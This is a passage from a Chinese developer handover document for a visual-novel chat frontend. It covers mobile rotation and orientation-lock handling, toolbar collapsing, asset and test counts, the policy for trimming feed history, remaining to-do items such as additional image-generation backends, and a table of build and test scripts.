- **转着的时候要当心的**：`vw` / `vh` 和按宽度的 `@media` 还是按手机实际拿的方向算。
  所以手机版式里别再写 `100vw` / `100vh`，用 `100%`（`#envbar` 已改）；`m-rot` 下补了 `#stage`、开场引导外壳、
  小手机外框、提示条的宽高，cw 时把被 `max-width:680px` 误改成一列的开场表单改回两列。
  刘海 `--safe-*` 也按转的方向换边（cw 时画面的「上」= 屏幕右边）。`getBoundingClientRect()` 拿到的是转过之后
  屏幕上的框，量布局要用 `clientWidth` / `offsetTop` 这些（`refreshDlgHeight()` 用的就是 `clientHeight`，没问题）。
- **真锁屏** `realOrient()`：选横屏时在点击里同步调 `requestFullscreen()` → `screen.orientation.lock('landscape')`，
  都是尽力而为，失败就静默（CSS 已经转好了）。锁上后手机真转过来，`m-rot` 自动摘掉。切回竖屏 / 跟随时 `unlock()`，
  全屏是我们进的就退出。`fullscreenchange` 时重算（玩家用返回手势退全屏，锁也跟着没了）。
- **工具栏收起**：按钮包在 `#tb-items` 里，`#btn-tbhide` 是最后一个子元素。收起 = `#toolbar.collapsed`
  （`#tb-items` 用 transform 滑出去、透明、`inert`），`<html>` 上加 `tb-hidden` 给环境条让位。存 `gal_tb_hidden`。
  `refreshTbDot()` 在 `markCGNew()` / `refreshPhoneBadge()` 里调：收起时 CG 或手机有红点，把手上的 `#tb-dot` 亮。
- 工具栏往后再加键：手机竖屏一排现在是 7 个 40px 键 + 26px 把手 + 4px 间距 ≈ 334px，360 宽的手机正好放下，
  再加就得在 `html.m-port` 下缩键或者换行了（`e2e-mobile` 的「一排键全在屏幕里」会报）。
- 测试：`e2e-mobile.mjs` 「手动横竖屏」「工具栏收起」两节（191 项），冒烟 [7f]。

## 八、当前数据一览

- 表情差分：**74 角色 / 3594 张**（juus 73 + 天青 1）
- 默认立绘：**761 角色 / 2200 张** —— 其中 692 人只有默认立绘，没有表情差分
- 立绘查找优先级：**玩家手选皮肤** → 精确表情 → 换服装 → 老式拼接名 → 默认表情 → 默认立绘 → 随便挑
- 皮肤：597 人有皮肤可切（数组第 0 张是原皮），换装面板 ◈ 按钮
- 好感度：上限 100，**誓约后 200**；新角色默认 80（都是卡里的规则）
- 场景：**159 地点 / 190 张图**，外加 76 条预置地名别名
- 世界书：166 条（含 2 条引擎内置规则），启用 123
- 手机：792 头像 / 153 表情包 / 9 个群 / 3 条种子帖 / 3 条种子热点
- 开场白：7 个，每个都会自动推导初始变量（地点、时段、登场角色、服装）
- 冒烟测试：**277 项**（不带卡跑也全绿）；单测 **276 项**（`tools/unit/run-all.mjs`）
- 地名别名：**166 条**预置（原 76 条）。审计口径下哈希兜底 31% → **0%**
- 文生图：NovelAI，5 个模型档案，默认 `nai-diffusion-4-5-full` / 1216×832 / 23 步（免费档）

---

## 九、动态与热点的累积策略

`Phone.scan()` 每次都从**全部历史**重新扫一遍标签，所以动态和热点天然是累积的。
但累积到几十轮之后，注入主线的 `<手机记录>` 会把 token 撑爆，所以默认**攒够就换**：

- 动态保留最新 20 条、热点保留最新 20 条（设置 · 外观里可调 5~80）
- **种子内容永远保留**（开局自带的 3 帖 3 热点，是底子）
- 勾「只累积」就不裁，全留着

私聊和群聊不裁 —— 它们本来就按会话分开，单个会话不会无限长。

## 十、还没做的

v5.20 做掉了原来的 ③ 文生图、④ 地名别名、⑤ token 分词、⑥ 世界书向量检索。
剩下的：

1. **l2d.su 的皮肤名称** —— 现在皮肤只能叫「皮肤 1 / 皮肤 2」，卡里没有名称数据。
   站点 `robots.txt` 禁止自动抓取，沙盒网络也够不到，需要用户自己在浏览器控制台导出
   `{角色: [{皮肤名, 分类, 类型, 图片URL}]}` 这样的 JSON，再写个 `build-l2d.py` 接进来。
   Live2D / Spine 只取静态图即可；真跑动态需要 Cubism Core（专有许可）和 canvas 渲染层重写，
   属于另一个项目的规模。

2. **出图只接了 NovelAI**。`core/imagegen.js` 的 `BACKENDS` 是张表，
   再加 `sd_webui` / `comfyui` / `openai_compatible` 各补一个
   `(cfg, req) => Promise<{src, mimeType, …}>` 就行，上层完全不用动。
   开拓轶事的 `services/ai/imageGeneration.ts` 里这三条都有现成实现可以照搬：
   SD WebUI 走 `/sdapi/v1/txt2img`（有参考图就切 `img2img`），
   ComfyUI 走 `/prompt` 提交 + `/history` 轮询、需要用户提供带 `__PROMPT__` 占位符的
   workflow JSON，OpenAI 兼容走 `/v1/images/generations`。

3. **NAI 的 img2img / vibe transfer 没接**。想让同一个角色跨图保持长相，
   这是正路（现在靠两段式解析每次重写外观词，只能做到「大致一致」）。
   开拓轶事那边也标着「尚未接入」，没有现成代码可抄。

4. **语义检索的嵌入向量没做量化压缩**。现在是 512 维、4 位小数存 IndexedDB，
   166 条约 0.7MB。条目上千的卡可以考虑 int8 量化，再小四倍。

5. **CG 没有连续区块**。天青有 `<cg=场景名>…</cg>` 这种「这一段话全程铺同一张 CG」
   的写法，我们现在是一句一张。要做的话在 `cg.js` 的锚点那层加个区间概念即可。

## 十一、附：我跑过的脚本

`tools/` 里这些是工程的一部分，长期有用：

| 脚本 | 用途 |
|---|---|
| `build-juus.py` | 从 juus 卡抽立绘表、场景表、**默认立绘表** |
| `build-tianqing.py` | 从 Larimar 仓库抽天青的素材并撑开成两级结构 |
| `build-phone.py` | 抽手机的头像/表情包/群组/种子内容/样式 |
| `smoke-test.js` | **277 项冒烟测试**，用 jsdom 真跑 index.html |
| `unit/run-all.mjs` | **276 项单测**，各模块逻辑（不碰 DOM、不发请求） |

> 交接文档上一版里「123 项」和「144 项」两个数字打架。实测原始包不带卡跑是
> **129 项、挂 3 项**（那 3 项是测试自己写错，v5.20 已修）。现在是 277 项全绿。

`scripts-archive/` 里是调查用的一次性脚本，留作参考：
它们记录了「我是怎么知道这张卡里有什么」的过程 ——
找 `DEFAULT_SPRITES`、验证 JSON Patch 格式、统计立绘分布、
核对世界书激活结果、模拟假 API 跑完整往返等等。

接手时如果要确认某个数据到底长什么样，照着这些改改路径就能跑。
